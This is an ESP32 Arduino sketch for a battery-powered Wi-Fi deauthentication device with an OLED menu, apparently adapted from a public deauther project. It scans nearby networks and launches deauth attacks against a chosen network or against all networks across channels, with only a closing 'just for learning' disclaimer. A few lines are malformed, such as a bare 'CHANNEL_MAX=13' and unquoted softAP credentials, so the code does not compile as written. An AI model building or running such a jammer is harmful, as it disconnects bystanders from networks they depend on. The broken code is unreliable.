#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "web_interface.h"
#include "deauth.h"
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>





#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);
#define BTN_UP    32
#define BATTERY_PIN 34
#define BTN_DOWN  33
#define BTN_OK    25
#define BTN_BACK  26 
CHANNEL_MAX=13
float readBattery() {
int raw = analogRead(BATTERY_PIN);float voltage = (raw / 4095.0) * 3.3;voltage = voltage * 2;return voltage;
} //do ta 100k ohm -> 21 micro amper masrafesh hast
int menu_index= 0;
int scan_count = 0;
int selected_network =0;
bool scanning =false;
bool in_network_list =false;
int curr_channel = 1;
int getbattery();
void showMenu();
void executeOption(int index);
void showNetworks() {
  display.clearDisplay();display.setCursor(0,0);display.printf("(%d) Networks:", scan_count);
  for(int i=0; i<3 && (i+selected_network)<scan_count; i++) {int netIndex = i + selected_network;String ssid = WiFi.SSID(netIndex);
      display.setCursor(0, 20 + i*10);if(i==0) display.print(">");else display.print(" ");display.println(ssid);
  }
display.display();
}
void setup() {
#ifdef SERIAL_DEBUG
Serial.begin(115200);
#endif
WiFi.mode(WIFI_MODE_AP);WiFi.softAP(RamanT, Kali83839494);display.clearDisplay();display.setTextSize(1);display.setTextColor(SSD1306_WHITE);
pinMode(BTN_UP, INPUT_PULLUP); 
pinMode(BTN_DOWN, INPUT_PULLUP);
pinMode(BTN_OK, INPUT_PULLUP);
pinMode(BTN_BACK, INPUT_PULLUP);
display.setCursor(0,0);display.println("Raman Deauther");display.setCursor(0,20);display.println("Ready...");display.display();delay(3000);
showMenu();
start_web_interface(); //bayad be github link koni
}
void loop() {
if(in_network_list) {if(digitalRead(BTN_UP) == LOW) {
      if(selected_network > 0) selected_network--;showNetworks();delay(200);
    }
if(digitalRead(BTN_DOWN) == LOW) {
      if(selected_network < scan_count-1) selected_network++;showNetworks();delay(200);
    }
if(digitalRead(BTN_OK) == LOW) {
   display.clearDisplay();display.setCursor(0,0);
   display.print("Deauth: ");display.println(WiFi.SSID(selected_network));display.setCursor(0,10),display.print("Raman Is god... ");display.display();
start_deauth(selected_network, DEAUTH_TYPE_SINGLE, 1);delay(500);
}
if(digitalRead(BTN_BACK) == LOW) {stop_deauth();in_network_list = false;
 showMenu();delay(200);}
}else{
  if(digitalRead(BTN_UP) == LOW) {menu_index--;  
    if(menu_index < 0) menu_index = 2;  
    showMenu();delay(200);  
}  
if(digitalRead(BTN_DOWN) == LOW) {menu_index++;  
if(menu_index > 2) menu_index = 0;showMenu();  delay(200);  
}
if(digitalRead(BTN_OK) == LOW) {
  executeOption(menu_index);delay(200);
    }
if(digitalRead(BTN_BACK) == LOW) {
   stop_deauth();
   display.clearDisplay();
   display.setCursor(0,0);
   display.println("Stopped!");
   display.display();
   delay(500);
   showMenu();}}
if (deauth_type == DEAUTH_TYPE_ALL) {
    if (curr_channel > CHANNEL_MAX) curr_channel = 1;
    esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
    curr_channel++;delay(5);
}
else {
    web_interface_handle_client();
  }
}
void showMenu() {  
 display.clearDisplay();  
 display.setCursor(0,0);  
 display.println("Menu:");    
 display.setCursor(0,20);  
 display.println(menu_index == 0 ? "> Deauthone" : "  Deauth one"); 
 display.setCursor(0,30);  
 display.println(menu_index == 1 ? "> Deauth All" : "  Deauth All");  
 display.setCursor(0,40);  
 display.println(menu_index == 2 ? "> Battery" : "  Battery"); 
 display.display();}
void executeOption(int index) {
display.clearDisplay();
switch(index) {
    case 0:   // atack rooye yeki
      display.setCursor(0,0);display.println("Scanning...");display.setCursor(0,20);display.println("Raman is god");display.display();
      scan_count = WiFi.scanNetworks(false, true); //async khamooshe, bayad roshanesh koni va tabea finish_scan bezari, hidden network ro neshoon mide
      selected_network = 0;
      if(scan_count > 0) {
        in_network_list = true;
        showNetworks();
      } else {
        showMenu();
      }
      break;
    case 1:  // attack rooye hame
      display.setCursor(0,0);display.println("Deauth All...");display.setCursor(0,20);display.println("Raman is god");display.display();
      start_deauth(0, DEAUTH_TYPE_ALL, 1);
      break;
      case 2:  // Battery
      display.setCursor(0,0);
      int battery = getbattery();
      display.printf("Battery: %d%%", battery); //form namayesh darsad batry
      if(battery<20) {display.setCursor(0,20);display.printf("Low battery!");
        }display.display();delay(3000);showMenu();
      break;
  }
}
int getbattery() {
    float vbat = readBattery();
    if (vbat >= 4.2) return 100;
    else if (vbat >= 4.0) return 90;
    else if (vbat >= 3.9) return 80;
    else if (vbat >= 3.8) return 70;
    else if (vbat >= 3.7) return 60;
    else if (vbat >= 3.6) return 50;
    else if (vbat >= 3.5) return 40;
    else if (vbat >= 3.4) return 30;
    else if (vbat >= 3.3) return 20;
    else if (vbat >= 3.2) return 10;
    else return 0;
}


// every illigal activiti is on your own, this is just for learning
//report any bugs or suggestions to <tondroraman83@gmail.com>
//this code is inspired by: https://github.com/tesa-klebeband/ESP32-Deauther
